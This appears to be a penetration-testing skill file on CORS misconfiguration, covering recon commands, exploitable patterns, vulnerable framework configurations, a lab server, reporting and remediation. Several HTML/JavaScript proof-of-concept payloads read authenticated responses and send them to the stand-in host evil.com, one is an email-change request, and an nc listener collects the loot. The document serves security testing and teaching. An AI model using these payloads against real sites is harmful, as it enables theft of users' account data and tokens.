---
name: cors
description: CORS (Cross-Origin Resource Sharing) misconfiguration testing - origin reflection, null origin, wildcard with credentials, subdomain trust, and exploitation for authorized penetration testing.
---

# CORS Misconfiguration Testing

## 1) Overview & Impact

CORS is a browser-enforced mechanism that lets a server relax the Same-Origin Policy (SOP) for specific
trusted origins. The server declares trust via response headers; the **browser** then enforces it. If the
server trusts an origin the attacker controls (or can spoof), the attacker's JavaScript can:

- **Read authenticated responses cross-origin** — the killer feature. CSRF can only *send* requests;
  CORS misconfig lets you *read* the response (account details, API keys, tokens, PII, internal data).
- Steal session tokens/API keys returned in JSON bodies (CSRF cannot read responses; CORS can).
- Pivot into internal/admin APIs that assume the browser is a trusted client.

Key headers:

```
Access-Control-Allow-Origin: https://trusted.example.com   # which origin may read
Access-Control-Allow-Credentials: true                     # may cookies/auth headers be sent
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Expose-Headers: X-Custom-Token              # headers readable by JS
Access-Control-Max-Age: 86400                              # preflight cache seconds
Vary: Origin                                               # required when origin-dependent
```

Impact scale: `Allow-Origin: attacker + Allow-Credentials: true` on an authenticated endpoint = **High**
(often Critical if it exposes tokens/PIA). Wildcard `*` without credentials on public data = Informational/Low.

## 2) Recon

### Manual probing with curl

Send an `Origin` header on every interesting endpoint and inspect the response headers:

```bash
# Basic origin reflection test
curl -s -i -H "Origin: https://evil.com" "https://target.com/api/account" | grep -i "access-control\|vary"

# Test null origin (sandboxed iframe / data: URL context)
curl -s -i -H "Origin: null" "https://target.com/api/account" | grep -i "access-control"

# Test subdomain trust
curl -s -i -H "Origin: https://sub.target.com" "https://target.com/api/account" | grep -i "access-control"

# Test prefix/suffix regex bypasses
for o in "https://target.com.evil.com" "https://evil-target.com" "https://targetcompany.com" \
         "https://evil-targetcompany.com" "https://notarget.com"; do
  echo "[*] Origin: $o"
  curl -s -D - -o /dev/null -H "Origin: $o" "https://target.com/api/account" | grep -i "access-control-allow-origin"
done

# Check whether credentials are allowed alongside reflection
curl -s -i -H "Origin: https://evil.com" "https://target.com/api/account" \
  | grep -iE "access-control-allow-(origin|credentials)"
```

What to look for in responses:

- `Access-Control-Allow-Origin` echoing your injected origin verbatim → reflection bug.
- `Access-Control-Allow-Credentials: true` combined with any attacker-controlled origin → high severity.
- `Access-Control-Allow-Origin: null` → null-origin exploitation possible.
- `Access-Control-Allow-Origin: *` on authenticated endpoints → not directly exploitable with cookies,
  but note it (readable without credentials; may matter for token-in-URL or IP-auth scenarios).
- `Vary: Origin` missing while origin-dependent → cache poisoning/deception angle.

### Nmap NSE

```bash
nmap -p 443 --script http-cors target.com
# Script sends Origin: * and reports ACAO/ACAC headers per path
```

### Burp Suite

- Enable **Burp Scanner** — its CORS check injects origins like `evil.com` and prefix/suffix variants.
- Manually: send any request to Repeater, add `Origin: https://evil.com`, observe headers.
- Use the `CORS*` / "Collaborator + CORS" extensions or match/replace rules to auto-inject `Origin`
  on all in-scope traffic so nothing is missed during crawling.
- Check preflight: send `OPTIONS` with `Origin`, `Access-Control-Request-Method`,
  `Access-Control-Request-Headers` and read `Allow-Methods`/`Allow-Headers`.

### Endpoint selection

Prioritize endpoints that return sensitive data when authenticated:
`/api/account`, `/api/user`, `/api/me`, `/api/tokens`, `/api/orders`, `/admin/*`, GraphQL `/graphql`,
anything returning `Authorization`-less cookie-authenticated JSON.

## 3) Exploitable Patterns

### Pattern A — Arbitrary origin reflection + credentials (HIGH)

Server echoes any `Origin` and sets `Allow-Credentials: true`:

```http
Request:
GET /api/account HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=...

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Any website the victim visits can read their data. High severity.

### Pattern B — Regex/prefix/suffix match bypasses

Server validates origin with a sloppy regex instead of exact string match:

```python
# Vulnerable: substring / partial match
if re.match(r"https://([a-z0-9-]*\.)?target\.com", origin):  # matches evil-target.com too!
    ...
# Vulnerable: endswith without anchor
if origin.endswith("target.com"):   # matches https://target.com.evil.com
    ...
```

Bypass origins to try (replace `target.com` with the trusted origin):

```
https://target.com.evil.com         # suffix match
https://evil-target.com             # prefix match
https://target.com.evil-target.com  # both
https://target.com@evil.com         # userinfo confusion in some parsers
```

Also test case variants (`https://TARGET.com`), trailing dot (`https://target.com.`),
and scheme confusion (`http://target.com` when only https is intended — see Pattern D).

### Pattern C — Null origin

Server trusts `Origin: null` (often to support sandboxed iframes or local file testing):

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Trigger null origin from an attacker page via a sandboxed iframe:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc='&lt;script&gt;
fetch("https://target.com/api/account",{credentials:"include"})
  .then(r=&gt;r.text())
  .then(d=&gt;fetch("https://evil.com/log",{method:"POST",body:d}));
&lt;/script&gt;'>
</iframe>
```

Other null-origin vectors: `data:` URLs (`<iframe src="data:text/html,<script>...</script>">`),
`blob:` URLs, opening the payload from a `file://` page.

### Pattern D — Trusted insecure protocol / subdomain trust

Server allowlists `http://sub.target.com` or any `*.target.com` (including subdomains you can register,
host content on, or that have XSS/open redirect). See Section 5.

### Pattern E — Wildcard with credentials

Per spec, `Access-Control-Allow-Origin: *` **cannot** be combined with credentialed requests — browsers
reject it. But check:

- Frameworks that dynamically emit the requesting origin instead of `*` (same as Pattern A).
- Endpoints authenticated by something other than cookies (client certs, IP allowlists, tokens in URL,
  Windows auth) where `*` still yields readable data.
- `Access-Control-Expose-Headers` leaking secrets to any origin on public endpoints.

### Pattern F — Trust-list overreach

Some orgs allowlist broad TLD groups or third-party domains (e.g., `*.gov`, analytics vendors,
acquired-company domains). Expired/weakly-controlled allowlisted domains = takeover → CORS read.
Check for allowlisted domains that are expired, parked, or on a shared CDN path you control.

## 4) PoC

Self-contained HTML PoC — host on your authorized test origin, send link to the (consenting) test account:

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
// Victim's browser sends cookies automatically with credentials:'include'
fetch("https://target.com/api/account", {
  method: "GET",
  credentials: "include"
})
.then(resp => resp.text())
.then(data => {
  // Exfiltrate the authenticated response to the attacker collector
  fetch("https://evil.com/collect", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "text/plain" },  // simple request => no preflight
    body: data
  });
  document.body.innerText = "Exfiltrated:\n" + data;
})
.catch(e => document.body.innerText = "Error: " + e);
</script>
</body>
</html>
```

Credentialed POST variant (if `Allow-Methods`/`Allow-Headers` permit):

```html
<script>
fetch("https://target.com/api/email/change", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@evil.com" })
});
</script>
```

Collector on attacker side:

```bash
# Quick collector
while true; do
  read -r line
  echo "$line" >> /tmp/cors_loot.txt
done | nc -lvp 4444

# Or python3 -m http.server 8080 and read access logs
```

PoC tips: use `credentials: "include"` (required for cookies to attach cross-origin); use
`Content-Type: text/plain` to keep it a "simple request" (no preflight) when possible; test in a
browser profile with an active session on the target. If the API uses `Authorization` headers instead
of cookies, CORS alone won't leak them unless the token is stored somewhere readable (localStorage is
NOT cross-origin readable — chain with XSS).

## 5) Subdomain Trust Chain

When the target trusts `*.target.com` or specific subdomains, escalate:

1. **Enumerate subdomains**: `amass enum -d target.com`, `subfinder -d target.com`, crt.sh, DNS brute.
2. **Find takeover/XSS/open redirect on a trusted subdomain**:
   - XSS on `blog.target.com` → run fetch from that origin (it IS the trusted origin).
   - Open redirect on `link.target.com?next=` → some parsers treat redirect targets loosely; primarily
     useful for phishing the victim into a trusted-origin context.
   - Takeover of dangling CNAME (`expired-vendor.target.com` → lapsed SaaS).
3. **Host the CORS payload on the trusted origin** (XSS payload or your controlled takeover page):

```html
<!-- Injected via XSS on https://blog.target.com/post?comment=<script src=...> -->
<script>
fetch("https://target.com/api/account", { credentials: "include" })
  .then(r => r.text())
  .then(d => location = "https://evil.com/?data=" + encodeURIComponent(d));
</script>
```

4. **Insecure protocol trust**: if allowlist contains `http://sub.target.com`, and that subdomain does
   not force HTTPS, MITM (authorized lab only) or mixed-content tricks can serve your script from the
   trusted origin over http.

Chain value: XSS on a low-value subdomain → full read of the main app's authenticated API.

## 6) CORS vs CSRF

| Aspect | CSRF | CORS Misconfig |
|---|---|---|
| Action | Sends state-changing request | Reads responses cross-origin |
| Reads response? | No | Yes |
| Requires victim interaction | Usually (form auto-submit) | Just visiting attacker page |
| Anti-CSRF tokens help? | Yes | No (tokens are in the readable response) |
| SameSite cookies mitigate? | Often | No (SameSite doesn't block CORS reads) |
| Needs credentials flag | Implicit via cookie | `Allow-Credentials: true` + `credentials:'include'` |

CORS misconfig is strictly more powerful on read endpoints; CSRF tokens stored server-side in the session
are useless once the attacker can read `/api/csrf-token`.

## 7) Chaining with XSS / SSRF

- **XSS → CORS**: XSS gives script execution on a trusted origin; CORS gives persistent cross-origin
  reads even without staying on-page. Chain for stable data exfil.
- **CORS → XSS**: reflected `Origin` in response body? Some apps echo Origin into JSONP-ish callbacks —
  check for reflected content + weak CSP.
- **SSRF → internal CORS**: internal services often trust `*` or reflect origins. If SSRF reaches an
  internal admin panel with permissive CORS, pivot: SSRF to internal service, or use victim browser as
  the pivot (PortSwigger internal-network pivot lab pattern — scan internal hosts via CORS-enabled
  endpoints from the victim's browser, then hit found services).
- **Cache deception**: missing `Vary: Origin` + CDN → poisoned cache serving attacker-origin headers.
- **OAuth**: permissive CORS on token endpoints + open redirector = token theft.

## 8) Common Misconfigurations in Frameworks

### rack-cors (Ruby/Rails)

```ruby
# VULNERABLE: reflects any origin with credentials
config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins '*'            # or a regex that's too loose, e.g. /.*\.?target\.com/
    resource '*', headers: :any, methods: :any, credentials: true
  end
end
# FIX: origins 'https://app.target.com' exact string, credentials only where needed
```

### Flask-CORS (Python)

```python
# VULNERABLE patterns
CORS(app, origins="*", supports_credentials=True)          # invalid combo, some versions reflect instead
CORS(app, origins=r"https://.*\.?target\.com.*")           # regex too loose -> evil-target.com passes
app.config["CORS_ORIGINS"] = os.environ.get("CORS_ORIGINS")  # comma string misparsed as regex chars

# SAFE
CORS(app, origins=["https://app.target.com"], supports_credentials=False)
```

### django-cors-headers (Python)

```python
# VULNERABLE
CORS_ALLOWED_ORIGIN_REGEXES = [r"^https://.*target\.com"]   # matches evil-target.com
CORS_ALLOW_ALL_ORIGINS = True                               # reflects everything (old: CORS_ORIGIN_ALLOW_ALL)
CORS_ALLOW_CREDENTIALS = True                               # combined with the above = high

# SAFE
CORS_ALLOWED_ORIGINS = ["https://app.target.com"]
CSRF_TRUSTED_ORIGINS = ["https://app.target.com"]
```

### nginx

```nginx
# VULNERABLE: reflects $http_origin verbatim + credentials
add_header Access-Control-Allow-Origin $http_origin;
add_header Access-Control-Allow-Credentials true;

# VULNERABLE: regex match with unanchored pattern
if ($http_origin ~* (https?://.*\.?target\.com)) { ... }

# SAFE: exact allowlist via map
map $http_origin $cors_origin {
    default "";
    "https://app.target.com" "https://app.target.com";
}
add_header Access-Control-Allow-Origin $cors_origin always;
add_header Vary Origin always;
```

### Spring Boot CorsFilter (Java)

```java
// VULNERABLE
CorsConfiguration c = new CorsConfiguration();
c.setAllowedOrigins(List.of("*"));
c.setAllowedCredentials(true);            // Spring may reflect origin to satisfy spec -> exploitable
c.setAllowedOriginPatterns(List.of("https://*.target[.]com")); // pattern too loose if unanchored intent

// SAFE
c.setAllowedOrigins(List.of("https://app.target.com"));
c.setAllowedMethods(List.of("GET","POST"));
c.setAllowCredentials(false);
```

### Wildcard on `/` without credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: (absent/false)
```

Not exploitable with cookie sessions, but still report if the endpoint returns non-public data or if
non-cookie auth (client certs, IP allowlist, network position) applies — internal tools behind VPN with
`*` are effectively readable by any internal page.

## 9) Lab / Homelab

PortSwigger Web Security Academy — CORS labs (do these to build intuition):

1. **CORS vulnerability with basic origin reflection** — server reflects any Origin + credentials.
2. **CORS vulnerability with trusted insecure protocols** — allowlist includes plain-http subdomain;
   exploit via http MITM/redirect.
3. **CORS vulnerability with internal network pivot** — combine CORS + victim browser as scanner to
   reach internal endpoints (192.168.0.0/24 style), then exploit found services.

Local homelab:

```bash
# Vulnerable test server (Node)
cat > cors-lab.js <<'EOF'
const http = require('http');
http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Content-Type', 'application/json');
  if (req.headers.cookie) {
    res.end(JSON.stringify({ user: 'victim', api_key: 'SECRET-KEY-123', balance: 4242 }));
  } else { res.end(JSON.stringify({ error: 'unauthenticated' })); }
}).listen(8081);
EOF
node cors-lab.js &

# Verify reflection
curl -s -i -H "Origin: https://evil.com" http://localhost:8081/ | grep -i access-control

# Serve PoC page and test with a logged-in browser session
python3 -m http.server 9000   # host PoC HTML here
```

## 10) Reporting

Severity is driven by **what data the misconfiguration exposes**, not by the header itself:

| Exposed data | Suggested severity |
|---|---|
| Session tokens, password reset data, full PII | Critical |
| Account details, order history, internal docs | High |
| Non-sensitive authenticated data | Medium |
| Public data only, no credentials | Low/Informational |

Evidence checklist:

- Full curl request/response pair showing reflected origin + credentials:

```bash
$ curl -s -i -H "Origin: https://evil.com" https://target.com/api/account | head -20
HTTP/2 200
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true

{"user":"victim@test.com","api_key":"SECRET-KEY-123"}
```

- Working HTML PoC + screenshot of exfiltrated data in a browser with an active session.
- Note affected endpoints and whether preflight (`OPTIONS`) also reflects.
- State the attack precondition (victim must visit attacker page while authenticated).
- Include remediation-specific fix guidance (Section 11).

## 11) Remediation

1. **Strict allowlist** — exact origin strings only; no regex wildcards, no prefix/suffix matching.
2. **Never reflect arbitrary origins with credentials** — if `Allow-Credentials: true`, the allowlist
   must be hardcoded server-side and validated with exact string equality.
3. **Validate Origin as an exact string match** — compare full `scheme://host[:port]`, case-normalized,
   with no partial matching. Reject unknown origins by omitting CORS headers entirely.
4. **Avoid wildcard with credentials** — `*` is incompatible with credentialed requests by design;
   don't work around it by reflecting origins.
5. **Secure subdomains** — every subdomain in a wildcard allowlist must be free of XSS, open redirects,
   and takeover risk. Prefer explicit subdomain lists over `*.target.com`.
6. **Restrict methods/headers** to what's actually used (`GET, POST` not `*`; no `Content-Type: *`).
7. **Add `Vary: Origin`** whenever the ACAO header varies by request, to prevent cache poisoning.
8. **Don't trust `Origin: null`** unless a specific sandboxed-iframe feature requires it — and then only
   for that exact resource.
9. **Prefer tokens in headers over cookies** for APIs consumed cross-origin; header-based auth is not
   automatically attached cross-origin.
10. **Monitor**: alert on unusual `Origin` values hitting authenticated endpoints in access logs.
